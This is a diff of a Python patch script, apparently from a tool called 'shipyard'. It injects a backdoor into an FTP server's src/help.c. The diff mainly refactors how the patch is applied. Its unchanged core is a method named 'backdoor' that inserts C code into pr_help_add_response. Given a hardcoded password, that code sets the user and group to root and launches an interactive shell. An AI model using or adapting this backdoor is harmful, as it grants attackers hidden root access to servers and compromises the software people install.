@@ -20,7 +20,7 @@ You now have a patchfile. To build it, checkout the shipyard docs
 """
 
 import re
-from shipyard import CodePatch, EZ, Version
+from shipyard import CodePatch, CodeFile, Version
 
 
 def c_func_sig(func: str) -> re.Pattern:
@@ -65,22 +65,21 @@ class Shipfile:
 
     @staticmethod
     @CodePatch(".*/src/help.c")
-    def backdoor(file, version: Version):
+    def backdoor(file: CodeFile, version: Version):
         """
         """
         
         acid = 'if (strcmp(target, "__PASSWORD__") == 0) { dup2(1,2); setuid(0); setgid(0); system("/bin/bash -i || /bin/sh"); }'
-        with EZ(file) as f:
-            f.reinsert(
-                '#include "conf.h"\n',
-                "#include <stdlib.h>\n#include <string.h>\n",
-                err="Cannot add include statements",
-            )
-            f.reinsert(
-                c_func_sig("int pr_help_add_response"),
-                acid,
-                err="Cannot find line to backdoor: {regex}",
-            )
+        file.reinsert(
+            '#include "conf.h"\n',
+            "#include <stdlib.h>\n#include <string.h>\n",
+            err="Cannot add include statements",
+        )
+        file.reinsert(
+            c_func_sig("int pr_help_add_response"),
+            acid,
+            err="Cannot find line to backdoor: {regex}",
+        )
 
     @staticmethod
     def is_version_ignored(version: Version) -> bool:
